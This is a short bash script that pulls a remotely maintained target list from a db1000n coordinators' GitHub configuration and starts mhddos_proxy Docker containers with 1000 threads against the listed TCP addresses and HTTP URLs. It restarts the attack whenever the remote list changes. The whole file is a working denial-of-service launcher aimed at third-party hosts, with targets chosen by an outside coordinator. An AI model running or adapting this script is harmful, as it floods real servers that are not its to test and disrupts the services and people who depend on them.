#!/bin/bash
ORIGINAL_TARGET=/tmp/targets
TEMP_TARGET=/tmp/targets_temp
BASE_URL="https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json"
CreateContainer()
{
    curl $BASE_URL > $ORIGINAL_TARGET
    docker rm -f mhddos_proxy_tcp
    docker rm -f mhddos_proxy_http
    docker run -d --name mhddos_proxy_tcp --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 1000 $(curl $BASE_URL |grep addr | cut -d'"' -f 4 | sed 's/^/tcp:\/\//')
    docker run -d --name mhddos_proxy_http --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 1000 $(curl $BASE_URL |grep path | cut -d'"' -f 4)
    sudo echo "Restarted at $(date)" >> /tmp/restart.log
}
# first run check
if [ ! -f "$ORIGINAL_TARGET" ]
then
    curl $BASE_URL > $ORIGINAL_TARGET
    CreateContainer
fi
# get updated version for compare
curl $BASE_URL > $TEMP_TARGET
# compare temp files and run function if difference detected
DIFF=$(diff -q $ORIGINAL_TARGET $TEMP_TARGET )
if [ "$DIFF" != "" ]
then
    CreateContainer
fi
